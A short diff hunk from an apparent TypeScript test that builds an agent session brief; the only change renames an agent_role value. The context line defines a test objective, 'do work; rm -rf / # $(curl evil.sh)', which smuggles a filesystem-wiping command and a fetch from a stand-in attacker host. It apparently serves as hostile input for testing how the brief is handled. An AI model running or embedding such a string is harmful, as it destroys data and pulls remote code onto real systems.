@@ -22,7 +22,7 @@ const MALICIOUS_OBJECTIVE = "do work; rm -rf / # $(curl evil.sh)";
 function makeBrief(overrides: Partial<SessionBrief> = {}): SessionBrief {
   return SessionBriefSchema.parse({
     trace_id: "00000000-0000-4000-8000-0000000000aa",
-    agent_role: "test-identity",
+    agent_role: "test-role",
     gate: "code_changes",
     tool: "claude-code",
     objective: MALICIOUS_OBJECTIVE,
